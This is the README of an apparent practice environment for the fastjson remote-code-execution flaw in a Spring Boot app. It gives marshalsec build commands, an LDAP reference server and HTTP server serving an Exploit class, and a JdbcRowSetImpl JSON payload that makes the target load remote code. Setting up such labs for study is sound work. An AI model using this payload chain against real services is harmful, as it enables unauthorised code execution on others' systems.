# fastjson-rce
![](https://img.shields.io/badge/language-java-yellow)
![](https://img.shields.io/github/stars/dbgee/fastjson-rce)
![](https://img.shields.io/github/workflow/status/dbgee/fastjson-rce/Maven%20Package)

fastjson rce env based on springboot

## 环境说明
* Exploit.java  编译好的class 文件文件和利用工具在Exploit 目录下

* 利用工具也可以自行下载编译
  ```shell script
    git clone https://github.com/mbechler/marshalsec.git [克隆项目到本地]
    mvn clean package -DskipTests  [这条命令执行完之后会在target 目录生成我们需要的可执行文件：marshalsec-0.0.3-SNAPSHOT-all.jar]
  ```

## 使用步骤
1. java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#Exploit 10086 
2. python -m http.server 8081
3. 发送利用payload：{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://127.0.0.1:10086/Object","autoCommit": true}

## update info
通过H2 数据库，对数据做了持久化处理，可以保存提交的数据到服务端

## TODO
- [ ] 分析漏洞源码
- [ ] 分析补丁情况

## 参考文章
* https://mp.weixin.qq.com/s/TmltzIJmGqYJZ4q4Rm0V-g